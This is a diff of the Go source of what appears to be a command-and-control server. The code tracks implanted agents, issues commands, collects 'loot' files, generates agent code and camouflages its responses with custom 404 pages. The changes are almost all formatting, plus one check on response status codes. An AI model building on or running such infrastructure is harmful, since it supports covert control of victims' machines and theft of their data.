@@ -7,10 +7,9 @@ import (
 	"crypto/mlkem"
 	crand "crypto/rand"
 	"crypto/tls"
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
-	"encoding/binary"
-	"reflect"
 	"errors"
 	"flag"
 	"fmt"
@@ -25,6 +24,7 @@ import (
 	"net/netip"
 	"os"
 	"path/filepath"
+	"reflect"
 	"regexp"
 	client_ "server/client"
 	"server/protocol"
@@ -38,7 +38,7 @@ import (
 var (
 	/*不可清理*/ mutex = &sync.RWMutex{}
 
-	mlkemKeys   = make(map[string]mlkemKeyPair)
+	mlkemKeys = make(map[string]mlkemKeyPair)
 	/*不可清理*/ mlkemKeysMu sync.RWMutex
 
 	/*不可清理*/
@@ -164,13 +164,13 @@ func (m *MainHandler) Index(conn, Get_Msg, switch_key, download, result, net, in
 				pair, ok := mlkemKeys[uid]
 				publicKey := append([]byte(nil), pair.public...)
 				mlkemKeysMu.RUnlock()
-			
+
 				if !ok || len(publicKey) != mlkem.EncapsulationKeySize768 {
 					return
 				}
 
 				fmt.Fprint(w, customBase64Encode(publicKey, base_rounds))
-				
+
 			case Get_Msg: //获取指令
 				data := GetMsg(uid, uidBytes)
 				fmt.Fprint(w, data)
@@ -180,7 +180,7 @@ func (m *MainHandler) Index(conn, Get_Msg, switch_key, download, result, net, in
 				key_decode, _ := customBase64Decode(byte_base_key_mid, code_rounds)
 
 				Switch_key(uid, key_decode)
-				
+
 			case download:
 
 				filekey := r.URL.Query().Get(filekey)
@@ -262,9 +262,9 @@ func (m *MainHandler) Index(conn, Get_Msg, switch_key, download, result, net, in
 					return
 				}
 				if windows_pro == "group_pro" {
-					Windows_GetInfo(uid, encry_str,clientIP,key, code_rounds)
+					Windows_GetInfo(uid, encry_str, clientIP, key, code_rounds)
 				} else {
-					GetInfo(uid, encry_str,clientIP,key, code_rounds)
+					GetInfo(uid, encry_str, clientIP, key, code_rounds)
 				}
 
 			case upload:
@@ -616,7 +616,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 		// 打印请求头
 		usernameCookie, err := r.Cookie("cookie")
 		if err != nil {
-			web_ui.WriteCustomError(w, http.StatusNotFound,error_str, notFoundHeaders)
+			web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
 			return
 		}
 		var foundUser bool
@@ -769,16 +769,16 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					})
 				case "insertKey":
 					uid, _ := body["uid"].(string)
-				
+
 					created, exists := insertKeyMap(uid)
-				
+
 					response := map[string]interface{}{
 						"code":    400,
 						"uid":     uid,
 						"path":    "insertKey",
 						"message": "insert fail",
 					}
-				
+
 					if created {
 						response["code"] = 200
 						response["message"] = "insert success"
@@ -786,7 +786,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						response["code"] = 409
 						response["message"] = "key already exists"
 					}
-				
+
 					if err := clientWs.WriteJSON(response); err != nil {
 						break
 					}
@@ -1222,12 +1222,12 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						"uid":     uid,
 						"file":    fileName,
 					})
-					logStr := fmt.Sprintf(log_word["del_loot"], username,fileName)
+					logStr := fmt.Sprintf(log_word["del_loot"], username, fileName)
 					logger.WriteLog(logStr)
 
 					go PushWS("", "send_delloot", map[string]interface{}{
-						"uid":    uid,
-						"file":   fileName,
+						"uid":  uid,
+						"file": fileName,
 					})
 
 				case "download_loot":
@@ -1344,15 +1344,15 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 
 					host, port, err := net.SplitHostPort(server)
 					if err != nil || host == "" || port == "" {
-					    clientWs.WriteJSON(map[string]interface{}{
-					        "code":    400,
-					        "path":    "agentcode",
-					        "message": "invalid server",
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "agentcode",
+							"message": "invalid server",
 							"taskid":  taskid,
-					    })
-					    continue
+						})
+						continue
 					}
-					
+
 					server = net.JoinHostPort(host, port)
 
 					serverRouteMu.RLock()
@@ -1371,10 +1371,10 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						download, result, _net, info, upload, list, option, username_, uid,
 						hostname, keyPart, filekey, code_, base_rounds, windows_pro)
 					clientWs.WriteJSON(map[string]interface{}{
-						"code": 200,
-						"path": "agentcode",
-						"taskid":  taskid,
-						"data": code,
+						"code":   200,
+						"path":   "agentcode",
+						"taskid": taskid,
+						"data":   code,
 					})
 				case "delserver":
 					port, ok := body["port"].(string)
@@ -1937,8 +1937,8 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					taskid, _ := body["taskid"].(string)
 					if remark == "" || code == "" || osName == "" || codeWords == "" {
 						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "insertPlugin",
+							"code":    400,
+							"path":    "insertPlugin",
 							"taskid":  taskid,
 							"message": "parameter does not exist",
 						})
@@ -2139,72 +2139,72 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 							"message": message,
 						})
 					}
-				
+
 					rawPort, exists := body["port"]
 					if !exists {
 						writeError(400, "port does not exist")
 						continue
 					}
-				
+
 					port, err := normalizePort(rawPort)
 					if err != nil {
 						writeError(400, err.Error())
 						continue
 					}
-				
+
 					rawResponseHead, exists := body["response_head"]
 					if !exists {
 						writeError(400, "response_head does not exist")
 						continue
 					}
-				
+
 					headers, err := normalizeResponseHeaders(rawResponseHead)
 					if err != nil {
 						writeError(400, err.Error())
 						continue
 					}
-				
+
 					responseHead := ""
-				
+
 					if len(headers) > 0 {
 						data, err := json.Marshal(headers)
 						if err != nil {
 							writeError(400, "failed to encode response headers")
 							continue
 						}
-				
+
 						responseHead = string(data)
 					}
-				
+
 					found := false
-				
+
 					serverDataMu.Lock()
-				
+
 					for i := range server_data.Servers {
 						server := &server_data.Servers[i]
-				
+
 						if server.Port == port {
 							server.ResponseHead = responseHead
 							found = true
 							break
 						}
 					}
-				
+
 					serverDataMu.Unlock()
-				
+
 					if !found {
 						writeError(404, "server for this port was not found")
 						continue
 					}
-				
+
 					protocol.UpdateRespHead(port, responseHead)
-				
+
 					message := "Response header updated successfully"
-				
+
 					if responseHead == "" {
 						message = "Response header cleared successfully"
 					}
-				
+
 					_ = clientWs.WriteJSON(map[string]interface{}{
 						"code":    200,
 						"path":    "changeResponseHead",
@@ -2503,7 +2503,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 								})
 								continue
 							}
-					
+
 							requestData.ResponseHead = string(data)
 						}
 					}
@@ -2601,7 +2601,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					})
 				case "uploadFile":
 					uid, ok := body["uid"].(string)
-					if !ok{
+					if !ok {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    400,
 							"path":    "uploadFile",
@@ -2610,7 +2610,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						continue
 					}
 					filename, ok := body["filename"].(string)
-					if !ok{
+					if !ok {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    400,
 							"path":    "uploadFile",
@@ -2993,13 +2993,23 @@ func normalizeResponseHeaders(v any) (map[string]string, error) {
 				key,
 			)
 		}
+		if strings.EqualFold(key, "status") {
+			statusText := strings.TrimSpace(text)
+			statusCode, err := strconv.Atoi(statusText)
+			if err != nil || statusCode < 100 || statusCode > 999 {
+				return nil, fmt.Errorf(
+					"response status must be an integer between 100 and 999",
+				)
+			}
+			text = strconv.Itoa(statusCode)
+		}
 		result[key] = text
 	}
 	return result, nil
 }
 
 // 接收
-func GetInfo(uid, encry_str,clientIP string,key []byte,code_map map[byte]int) {
+func GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[byte]int) {
 	var server_remark string
 	data := Get_decry_s(&encry_str, &key, code_map)
 
@@ -3039,7 +3049,7 @@ func GetInfo(uid, encry_str,clientIP string,key []byte,code_map map[byte]int) {
 	logger.WriteLog(log_str1)
 	go DeleteEntry(uid, false)
 }
-func Windows_GetInfo(uid, encry_str,clientIP  string,key []byte,code_map map[byte]int) {
+func Windows_GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[byte]int) {
 	data := Get_decry_s(&encry_str, &key, code_map)
 	data_list := strings.Split(data, "*//*")
 	if len(data_list) < 19 { // 需要11个字段
@@ -3327,7 +3337,7 @@ func insertKeyMap(uid string) (created bool, exists bool) {
 		if validMLKEMKeyPair(pair) {
 			return false, true
 		}
-		
+
 		clear(pair.private)
 		clear(pair.public)
 		delete(mlkemKeys, uid)
@@ -3339,7 +3349,7 @@ func insertKeyMap(uid string) (created bool, exists bool) {
 	}
 
 	privateKeyBytes := append([]byte(nil), decapsulationKey.Bytes()...)
-	publicKeyBytes := append([]byte(nil),decapsulationKey.EncapsulationKey().Bytes()...,)
+	publicKeyBytes := append([]byte(nil), decapsulationKey.EncapsulationKey().Bytes()...)
 
 	newPair := mlkemKeyPair{
 		private: privateKeyBytes,
@@ -3400,7 +3410,7 @@ func Switch_key(uid string, clientCiphertext []byte) {
 	hashBytes := hash.Sum(nil)
 	hashString := hex.EncodeToString(hashBytes)
 
-	log_str := fmt.Sprintf(log_word["agent_key"],hashString)
+	log_str := fmt.Sprintf(log_word["agent_key"], hashString)
 	logger.WriteLog(log_str)
 
 	keyMu.Lock()
@@ -3424,7 +3434,7 @@ func deleteMLKEMKey(uid string) {
 }
 
 func cleanupDeletedUID(uid string, deletedIndex int, delbase bool) {
-	
+
 	deleteMLKEMKey(uid)
 
 	if delbase {
@@ -4208,7 +4218,7 @@ func Net_results(uid, results string, code_rounds map[byte]int) {
 			clientDataMu.RUnlock()
 			logStr := fmt.Sprintf(log_word["scan_result"], shellname, uid, len(encryptedData))
 			logger.WriteLog(logStr)
-		}(encryptedData,uid)
+		}(encryptedData, uid)
 	}
 }
 func Check_comment(check_parts, option string) bool {
@@ -4501,7 +4511,7 @@ func UserIndex() []EnrichedClient {
 	defer serverPluginMu.RUnlock()
 	for i := range client_data.Clients {
 		client := &client_data.Clients[i]
-		pluginParamMap := buildPluginParamMap(client.Server,client.OS)
+		pluginParamMap := buildPluginParamMap(client.Server, client.OS)
 		enriched := EnrichedClient{
 			Username:        client.Username,
 			Host:            client.Host,
@@ -4545,7 +4555,7 @@ func updateIndex(uid string) *EnrichedClient {
 	}
 
 	serverPluginMu.RLock()
-	pluginParamMap := buildPluginParamMap(clientCopy.Server,clientCopy.OS)
+	pluginParamMap := buildPluginParamMap(clientCopy.Server, clientCopy.OS)
 	serverPluginMu.RUnlock()
 
 	enriched := EnrichedClient{
@@ -4608,7 +4618,7 @@ func windows_pro_UserIndex() []EnrichedWindowsClient {
 	defer serverPluginMu.RUnlock()
 	for i := range windows_client_data.Clients {
 		client := &windows_client_data.Clients[i]
-		pluginParamMap := buildPluginParamMap(client.Server,client.OS)
+		pluginParamMap := buildPluginParamMap(client.Server, client.OS)
 		enriched := EnrichedWindowsClient{
 			Username:        client.Username,
 			Host:            client.Host,
@@ -4662,7 +4672,7 @@ func updateIndex_windows(uid string) *EnrichedWindowsClient {
 	}
 
 	serverPluginMu.RLock()
-	pluginParamMap := buildPluginParamMap(clientCopy.Server,clientCopy.OS)
+	pluginParamMap := buildPluginParamMap(clientCopy.Server, clientCopy.OS)
 	serverPluginMu.RUnlock()
 
 	enriched := EnrichedWindowsClient{
@@ -4739,7 +4749,7 @@ func DownloadFile(uid, keyDecry string, code_map map[byte]int) ([]byte, error) {
 	}
 	decrydate := existingData[start:end]
 
-	partData := Encrypt(decrydate,[]byte(key))
+	partData := Encrypt(decrydate, []byte(key))
 	if partData == nil {
 		return nil, errors.New("encry fail")
 	}
@@ -4768,8 +4778,8 @@ func UploadFileHandler(uid, data, filename string,
 	}
 	key_part := []byte(key)
 	decry_data := Get_decry_s(&data, &key, code_map)
-	tempFilename := strings.TrimSpace(Get_decry_s(&filename, &key, code_map),)
-	realFilename := strings.TrimSpace(getFilenameFromPath(tempFilename),)
+	tempFilename := strings.TrimSpace(Get_decry_s(&filename, &key, code_map))
+	realFilename := strings.TrimSpace(getFilenameFromPath(tempFilename))
 	if !isSafeLootPathPart(realFilename) {
 		return
 	}
@@ -4813,15 +4823,15 @@ func UploadFileHandler(uid, data, filename string,
 	if err != nil {
 		return
 	}
-	
+
 	fileLog2 := fmt.Sprintf(log_word["request_file_part_"],
 		username, uid, realFilename, splitPos, startPos, endPos)
 	logger.WriteLog(fileLog2)
 
 	// 最后一块完成
 	if endPos == filePos {
-		loot := updateLoot(uid,realFilename)
-		if loot != nil{
+		loot := updateLoot(uid, realFilename)
+		if loot != nil {
 			PushWS("", "updateLoot",
 				map[string]interface{}{
 					"uid":  uid,
@@ -5242,7 +5252,6 @@ func updateInnet(uid string) Innet {
 	return Innet{}
 }
 
-
 func rotl(x uint32, n uint) uint32 {
 	return (x << n) | (x >> (32 - n))
 }
@@ -5375,13 +5384,14 @@ func Get_decry_s(input *string, key *[]byte, decodeMap map[byte]int) string {
 	}
 	return string(Decrypt(data, *key))
 }
+
 // 字符串加密
 func Get_encry_s(input *string, key *[]byte, base_rounds *string) string {
 	return customBase64Encode(
 		Encrypt(
-			[]byte(*input), 
+			[]byte(*input),
 			*key),
-			*base_rounds,
+		*base_rounds,
 	)
 }
 
@@ -6035,7 +6045,7 @@ func main() {
 	}
 
 	//登录
-	http.Handle("/"+login_route, withWhitelist(login(login_route, ui_route, web_css, web_title, login_file,cfg.NotFoundHeaders), cfg.NotFoundHeaders))
+	http.Handle("/"+login_route, withWhitelist(login(login_route, ui_route, web_css, web_title, login_file, cfg.NotFoundHeaders), cfg.NotFoundHeaders))
 
 	// --- 页面路由 ---
 	http.Handle("/"+ui_route, withWhitelist(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
@@ -6064,7 +6074,7 @@ func main() {
 		tempSessions := append([]string(nil), sessionSlice...)
 		mutex.RUnlock()
 
-		web_ui.Css(error_str,css_file,tempSessions,cfg.NotFoundHeaders).ServeHTTP(w, r)
+		web_ui.Css(error_str, css_file, tempSessions, cfg.NotFoundHeaders).ServeHTTP(w, r)
 	}), cfg.NotFoundHeaders))
 
 	// 创建 HTTP Server
@@ -6142,7 +6152,7 @@ func staticWithCustom404(root string, notFoundHeaders map[string]string) http.Ha
 		fileServer.ServeHTTP(rec, r)
 
 		if rec.Code == http.StatusNotFound {
-			web_ui.WriteCustomError(w, http.StatusNotFound,error_str, notFoundHeaders)
+			web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
 			return
 		}
 
@@ -6313,7 +6323,7 @@ func writeWhitelist(whitelist []string) error {
 }
 
 // 登录
-func login(login_route, ui_route, web_css, web_title, login_file string,notFoundHeaders map[string]string) http.HandlerFunc {
+func login(login_route, ui_route, web_css, web_title, login_file string, notFoundHeaders map[string]string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		if r.Method == http.MethodGet {
 			var html string
